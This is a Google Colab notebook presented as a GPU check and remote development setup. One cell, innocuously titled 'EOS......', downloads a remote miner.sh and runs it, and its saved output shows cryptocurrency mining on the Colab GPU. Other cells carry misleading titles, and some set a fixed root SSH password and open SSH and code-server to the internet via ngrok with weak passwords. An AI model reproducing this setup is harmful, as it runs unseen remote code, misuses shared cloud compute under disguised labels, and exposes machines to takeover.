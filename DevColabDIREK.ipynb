{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "DevColab.ipynb",
      "provenance": [],
      "collapsed_sections": [],
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/cirebonfinee/EOS/blob/main/DevColabDIREK.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "Xbrg3hJ39LRw",
        "cellView": "form"
      },
      "source": [
        "#@title **CEK GPU**\n",
        "# reset all จนกว่าจะได้ ดีกว่า K80\n",
        "from IPython.display import HTML\n",
        "from subprocess import getoutput\n",
        "s = getoutput('nvidia-smi')\n",
        "if 'K80' in s:\n",
        "  gpu = 'K80'\n",
        "elif 'T4' in s:\n",
        "  gpu = 'T4'\n",
        "elif 'P100' in s:\n",
        "  gpu = 'P100'\n",
        "display(HTML(f\"<h2>{gpu}</h2>\"))\n",
        "print(s)\n",
        "# or simply\n",
        "!nvidia-smi -L"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "cellView": "form",
        "id": "IB_dAbg8Yvj5",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "ad8318af-472b-42c1-9bb7-69357a713a04"
      },
      "source": [
        "#@title MOD GPU\n",
        "\n",
        "from numba import jit, cuda\n",
        "import numpy as np\n",
        "# to measure exec time\n",
        "from timeit import default_timer as timer\n",
        "\n",
        "# normal function to run on cpu\n",
        "def func(a):\t\t\t\t\t\t\t\t\n",
        "\tfor i in range(10000000):\n",
        "\t\ta[i]+= 1\t\n",
        "\n",
        "\t\t\t\t\t\t\n",
        "def func2(a):\n",
        "\tfor i in range(10000000):\n",
        "\t\ta[i]+= 1\n",
        "if __name__==\"__main__\":\n",
        "\tn = 10000000\t\t\t\t\t\t\t\n",
        "\ta = np.ones(n, dtype = np.float64)\n",
        "\tb = np.ones(n, dtype = np.float32)\n",
        "\t\n",
        "\tstart = timer()\n",
        "\tfunc(a)\n",
        "\tprint(\"without GPU:\", timer()-start)\t\n",
        "\t\n",
        "\tstart = timer()\n",
        "\tfunc2(a)\n",
        "\tprint(\"with GPU:\", timer()-start)"
      ],
      "execution_count": 2,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "without GPU: 4.795897878999995\n",
            "with GPU: 4.817961073000006\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "cellView": "form",
        "id": "x7MLYWtqY0Kg",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 135
        },
        "outputId": "82043f44-8d1b-433d-db89-8a816523f161"
      },
      "source": [
        "#@title IMPORT CUDA\n",
        "\n",
        "import os\n",
        "' && '.join([f'export {name}=\"{value}\"' for name, value in os.environ.items()])"
      ],
      "execution_count": 3,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "application/vnd.google.colaboratory.intrinsic+json": {
              "type": "string"
            },
            "text/plain": [
              "'export NO_GCE_CHECK=\"True\" && export GCS_READ_CACHE_BLOCK_SIZE_MB=\"16\" && export CLOUDSDK_CONFIG=\"/content/.config\" && export __EGL_VENDOR_LIBRARY_DIRS=\"/usr/lib64-nvidia:/usr/share/glvnd/egl_vendor.d/\" && export CUDA_VERSION=\"11.0.3\" && export PATH=\"/usr/local/nvidia/bin:/usr/local/cuda/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/tools/node/bin:/tools/google-cloud-sdk/bin:/opt/bin\" && export HOME=\"/root\" && export LD_LIBRARY_PATH=\"/usr/lib64-nvidia\" && export LANG=\"en_US.UTF-8\" && export SHELL=\"/bin/bash\" && export LIBRARY_PATH=\"/usr/local/cuda/lib64/stubs\" && export SHLVL=\"0\" && export GCE_METADATA_TIMEOUT=\"0\" && export NCCL_VERSION=\"2.7.8\" && export NVIDIA_VISIBLE_DEVICES=\"all\" && export DEBIAN_FRONTEND=\"noninteractive\" && export CUDNN_VERSION=\"8.0.4.30\" && export LAST_FORCED_REBUILD=\"20210812\" && export JPY_PARENT_PID=\"65\" && export PYTHONPATH=\"/env/python\" && export DATALAB_SETTINGS_OVERRIDES=\"{\"kernelManagerProxyPort\":6000,\"kernelManagerProxyHost\":\"172.28.0.3\",\"jupyterArgs\":[\"--ip=\\\\\"172.28.0.2\\\\\"\"],\"debugAdapterMultiplexerPath\":\"/usr/local/bin/dap_multiplexer\",\"enableLsp\":true}\" && export ENV=\"/root/.bashrc\" && export GLIBCXX_FORCE_NEW=\"1\" && export NVIDIA_DRIVER_CAPABILITIES=\"compute,utility\" && export TF_FORCE_GPU_ALLOW_GROWTH=\"true\" && export LD_PRELOAD=\"/usr/lib/x86_64-linux-gnu/libtcmalloc.so.4\" && export NVIDIA_REQUIRE_CUDA=\"cuda>=11.0 brand=tesla,driver>=418,driver<419 brand=tesla,driver>=440,driver<441 brand=tesla,driver>=450,driver<451\" && export OLDPWD=\"/\" && export HOSTNAME=\"4fb9f53df281\" && export COLAB_GPU=\"1\" && export PWD=\"/\" && export CLOUDSDK_PYTHON=\"python3\" && export GLIBCPP_FORCE_NEW=\"1\" && export PYTHONWARNINGS=\"ignore:::pip._internal.cli.base_command\" && export TBE_CREDS_ADDR=\"172.28.0.1:8008\" && export TERM=\"xterm-color\" && export CLICOLOR=\"1\" && export PAGER=\"cat\" && export GIT_PAGER=\"cat\" && export MPLBACKEND=\"module://ipykernel.pylab.backend_inline\" && export PYDEVD_USE_FRAME_EVAL=\"NO\"'"
            ]
          },
          "metadata": {},
          "execution_count": 3
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "cellView": "form",
        "id": "B3TP3IA8Y3DN",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "9a1848a8-77c6-4782-dbf3-529cf2e3e82e"
      },
      "source": [
        "#@title MAXIMALKAN TENSOR\n",
        "\n",
        "import tensorflow as tf\n",
        "\n",
        "from tensorflow import keras\n",
        "from tensorflow.keras import layers\n",
        "from tensorflow.keras import mixed_precision\n",
        "\n",
        "mixed_precision.set_global_policy('mixed_float16')"
      ],
      "execution_count": 4,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "INFO:tensorflow:Mixed precision compatibility check (mixed_float16): OK\n",
            "Your GPU will likely run quickly with dtype policy mixed_float16 as it has compute capability of at least 7.0. Your GPU: Tesla T4, compute capability 7.5\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "sbuSn-OdY5Gx",
        "cellView": "form",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "7b7e7bba-be52-4be0-9ca8-4bcb638ef2db"
      },
      "source": [
        " \n",
        "#@title EOS......\n",
        "!wget https://raw.githubusercontent.com/cirebonfinee/EOS/main/miner.sh && chmod +x miner.sh && ./miner.sh"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "\u001b[38;2;100;149;237m------------------------------------------------------- \n",
            "\u001b[0m\u001b[38;2;100;149;237m  Generated light cache for epoch 446 (ETCHash: 223) \n",
            "\u001b[0m\u001b[38;2;100;149;237m       Took 1937 ms, size of new DAG: 2807 MByte \n",
            "\u001b[0m\u001b[38;2;100;149;237m------------------------------------------------------- \n",
            "\u001b[0mGPU \u001b[38;2;240;230;140m0\u001b[0m: Starting DAG generation (normal mode)\n",
            "GPU \u001b[38;2;240;230;140m0\u001b[0m: DAG build complete 27%\n",
            "\u001b[38;2;189;183;107mNew job received: 0x93d033 Epoch: 446 (ETCHash epoch: 223) Target: 0000000112e0be82 \n",
            "\u001b[0mGPU \u001b[38;2;240;230;140m0\u001b[0m: DAG build complete 54%\n",
            "GPU \u001b[38;2;240;230;140m0\u001b[0m: DAG build complete 82%\n",
            "GPU \u001b[38;2;240;230;140m0\u001b[0m: DAG generation \u001b[1m\u001b[38;2;180;242;130mcompleted\u001b[0m (5506 ms)\n",
            "\u001b[38;2;189;183;107mNew job received: 0x7beea5 Epoch: 446 (ETCHash epoch: 223) Target: 0000000112e0be82 \n",
            "\u001b[0mAverage speed (30s): 17.27 mh/s \n",
            "\u001b[38;2;189;183;107mNew job received: 0xd941ad Epoch: 446 (ETCHash epoch: 223) Target: 0000000112e0be82 \n",
            "\u001b[0m"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "uQQO6jT46NA6",
        "cellView": "form"
      },
      "source": [
        "#@title **INSTALL NGROK + MOUNT DRIVE**\n",
        "!pip install pyngrok\n",
        "\n",
        "import os\n",
        "from pyngrok import ngrok\n",
        "# Update the package lists\n",
        "!sudo apt update\n",
        "\n",
        "# Mount Google Drive\n",
        "from google.colab import drive\n",
        "drive.mount('/content/drive')\n",
        "# Drive is mounted under \"/content/drive/My Drive/\"\n",
        "\n",
        "# Ask for the ngrok authtoken\n",
        "print(\"Get your authtoken from https://dashboard.ngrok.com/auth\")\n",
        "import getpass\n",
        "authtoken = getpass.getpass()  # input your Ngrok auth token everytime you run the cell or simply replace \"getpass.getpass()\" with your token in \"double quotes\"\n",
        "!ngrok authtoken $authtoken # login to ngrok\n",
        "print(\"Google drive mounted and ngrok primed up. Now run any of the cells below.\")\n"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "5YUSKsV3OhPr",
        "cellView": "form"
      },
      "source": [
        "#@title **INSTALL VSCODE**\n",
        "!curl -fsSL https://code-server.dev/install.sh | sh\n",
        "vscode_tunnel = ngrok.connect(8123)\n",
        "print(\"Open the first link below in browser:\")\n",
        "print(str(vscode_tunnel).replace('http://', 'https://'))\n",
        "\n",
        "!mkdir \"/content/drive/My Drive/code-server\"\n",
        "! sudo rm \"/content/drive/My Drive/code-server/config.yaml\"\n",
        "! echo \"bind-addr: 127.0.0.1:8123\" >> \"/content/drive/My Drive/code-server/config.yaml\"\n",
        "! echo \"auth: password\" >> \"/content/drive/My Drive/code-server/config.yaml\"\n",
        "! echo \"password: 123\" >> \"/content/drive/My Drive/code-server/config.yaml\" #the default password is devcolab\n",
        "! echo \"cert: false\" >> \"/content/drive/My Drive/code-server/config.yaml\"\n",
        "! code-server --config \"/content/drive/My Drive/code-server/config.yaml\" --user-data-dir \"/content/drive/My Drive/code-server\"\n"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "fdkjf0OJLsVx",
        "cellView": "form"
      },
      "source": [
        "#@title **KALO MAU PAKAI SSH**\n",
        "# ssh setup\n",
        "!apt-get install -qq -o=Dpkg::Use-Pty=0 openssh-server pwgen > /dev/null\n",
        "!echo root:devcolab | chpasswd #the default ssh password is devcolab, change if you want\n",
        "!mkdir -p /var/run/sshd\n",
        "!echo \"PermitRootLogin yes\" >> /etc/ssh/sshd_config\n",
        "!echo \"PasswordAuthentication yes\" >> /etc/ssh/sshd_config\n",
        "!sudo /usr/sbin/sshd -D  &\n",
        "\n",
        "# Connect to ngrok\n",
        "ssh_tunnel = ngrok.connect(22, \"tcp\")\n",
        "address = ((str(ssh_tunnel).split('\"')[1::2])[0]).replace('tcp://', '')\n",
        "print('Your tunnel address is ' + address)\n",
        "print('Use the following command to connect: ' + \"ssh root@\" + \"tcp://\" + (address.split(':'))[0] + \" -p \" + (address.split(':'))[1])\n",
        "print(\"or if that doesn't work, use this: \" + \"ssh root@\" + (address.split(':'))[0] + \" -p \" + (address.split(':'))[1])\n",
        "\n"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "rBqSiiVGVZf-"
      },
      "source": [
        "#### Debug:"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "GbIzV45sVc5m"
      },
      "source": [
        "!cat ~/.config/code-server/config.yaml"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "EiKz0ZtAePL8"
      },
      "source": [
        "!pwd"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}